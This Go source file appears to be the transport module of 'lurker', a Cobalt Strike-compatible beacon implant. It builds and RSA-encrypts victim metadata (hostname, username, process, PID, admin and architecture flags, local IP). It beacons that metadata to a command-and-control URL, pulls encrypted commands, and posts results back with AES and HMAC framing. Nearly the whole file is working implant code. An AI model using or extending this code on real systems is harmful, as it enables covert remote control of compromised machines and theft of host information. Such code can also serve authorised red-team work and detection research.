package transports

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strconv"
	"strings"
	"time"

	"lurker/lurker/constants"
	"lurker/lurker/cryptography"
	"lurker/lurker/os"
	"lurker/lurker/utilities"

	"github.com/imroc/req"
)

var (
	encryptedMetaInfo string
	clientID          int
)

func WritePacketLen(b []byte) []byte {
	length := len(b)
	return WriteInt(length)
}

func WriteInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}

func ReadInt(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}

func DecryptPacket(b []byte) []byte {
	decrypted, err := cryptography.AesCBCDecrypt(b, constants.AesKey)
	if err != nil {
		panic(err)
	}
	return decrypted
}

func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
	commandTypeBytes := make([]byte, 4)
	_, err := buf.Read(commandTypeBytes)
	if err != nil {
		panic(err)
	}
	commandType := binary.BigEndian.Uint32(commandTypeBytes)
	commandLenBytes := make([]byte, 4)
	_, err = buf.Read(commandLenBytes)
	if err != nil {
		panic(err)
	}
	commandLen := ReadInt(commandLenBytes)
	commandBuf := make([]byte, commandLen)
	_, err = buf.Read(commandBuf)
	if err != nil {
		panic(err)
	}
	*totalLen = *totalLen - (4 + 4 + commandLen)

	//For printing out command type from CS
	//fmt.Printf("Command type: %d", commandType)

	return commandType, commandBuf

}

func MakePacket(replyType int, b []byte) []byte {
	constants.Counter += 1
	buf := new(bytes.Buffer)
	counterBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(counterBytes, uint32(constants.Counter))
	buf.Write(counterBytes)

	if b != nil {
		resultLenBytes := make([]byte, 4)
		resultLen := len(b) + 4
		binary.BigEndian.PutUint32(resultLenBytes, uint32(resultLen))
		buf.Write(resultLenBytes)
	}

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := cryptography.AesCBCEncrypt(buf.Bytes(), constants.AesKey)
	if err != nil {
		return nil
	}
	// cut the zero because Golang's AES encrypt func will padding IV(block size in this situation is 16 bytes) before the cipher
	encrypted = encrypted[16:]

	buf.Reset()

	sendLen := len(encrypted) + cryptography.HmacHashLen
	sendLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(sendLenBytes, uint32(sendLen))
	buf.Write(sendLenBytes)
	buf.Write(encrypted)
	hmacHashBytes := cryptography.HmacHash(encrypted)
	buf.Write(hmacHashBytes)

	return buf.Bytes()

}

func EncryptedMetaInfo() string {
	packetUnencrypted := MakeMetaInfo()
	packetEncrypted, err := cryptography.RsaEncrypt(packetUnencrypted)
	if err != nil {
		panic(err)
	}

	finalPacket := base64.RawURLEncoding.EncodeToString(packetEncrypted)
	return finalPacket
}

/*
MetaData for 4.1

	Key(16) | Charset1(2) | Charset2(2) |
	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
*/
func MakeMetaInfo() []byte {
	cryptography.RandomAESKey()
	sha256hash := sha256.Sum256(constants.GlobalKey)
	constants.AesKey = sha256hash[:16]
	constants.HmacKey = sha256hash[16:]

	clientID = os.SessionID()
	processID := os.GetPID()
	//for link SSH, will not be implemented
	sshPort := 0
	/* for is X64 OS, is X64 Process, is ADMIN
	METADATA_FLAG_NOTHING = 1;
	METADATA_FLAG_X64_AGENT = 2;
	METADATA_FLAG_X64_SYSTEM = 4;
	METADATA_FLAG_ADMIN = 8;
	*/
	metadataFlag := os.GetMetaDataFlag()
	//for OS Version
	osVersion := os.GetOSVersion()
	osVerSlice := strings.Split(osVersion, ".")
	osMajorVerison := 0
	osMinorVersion := 0
	osBuild := 0
	if len(osVerSlice) == 3 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
		osBuild, _ = strconv.Atoi(osVerSlice[2])
	} else if len(osVerSlice) == 2 {
		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
	}

	ptrFuncAddr := 0
	ptrGMHFuncAddr := 0
	ptrGPAFuncAddr := 0

	processName := os.GetProcessName()
	localIP := os.GetLocalIPInt()
	hostName := os.GetComputerName()
	currentUser := os.GetUsername()

	localeANSI := os.GetCodePageANSI()
	localeOEM := os.GetCodePageOEM()

	clientIDBytes := make([]byte, 4)
	processIDBytes := make([]byte, 4)
	sshPortBytes := make([]byte, 2)
	flagBytes := make([]byte, 1)
	majorVerBytes := make([]byte, 1)
	minorVerBytes := make([]byte, 1)
	buildBytes := make([]byte, 2)
	ptrBytes := make([]byte, 4)
	ptrGMHBytes := make([]byte, 4)
	ptrGPABytes := make([]byte, 4)
	localIPBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	binary.BigEndian.PutUint16(sshPortBytes, uint16(sshPort))
	flagBytes[0] = byte(metadataFlag)
	majorVerBytes[0] = byte(osMajorVerison)
	minorVerBytes[0] = byte(osMinorVersion)
	binary.BigEndian.PutUint16(buildBytes, uint16(osBuild))
	binary.BigEndian.PutUint32(ptrBytes, uint32(ptrFuncAddr))
	binary.BigEndian.PutUint32(ptrGMHBytes, uint32(ptrGMHFuncAddr))
	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))

	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
	osInfoBytes := []byte(osInfo)

	onlineInfoBytes := utilities.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)

	metaInfo := utilities.BytesCombine(constants.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
	magicNum := os.GetMagicHead()
	metaLen := WritePacketLen(metaInfo)
	packetToEncrypt := utilities.BytesCombine(magicNum, metaLen, metaInfo)

	return packetToEncrypt
}

func InitialCallback() bool {
	encryptedMetaInfo = EncryptedMetaInfo()
	for {
		resp := HttpGet(constants.GetUrl, encryptedMetaInfo)
		if resp != nil {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	time.Sleep(constants.SleepTime)
	return true
}

func PullCommand() *req.Resp {
	resp := HttpGet(constants.GetUrl, encryptedMetaInfo)
	return resp
}

func PushResult(b []byte) *req.Resp {
	url := constants.PostUrl
	id := strconv.Itoa(clientID)
	resp := HttpPost(url, id, b)
	return resp
}
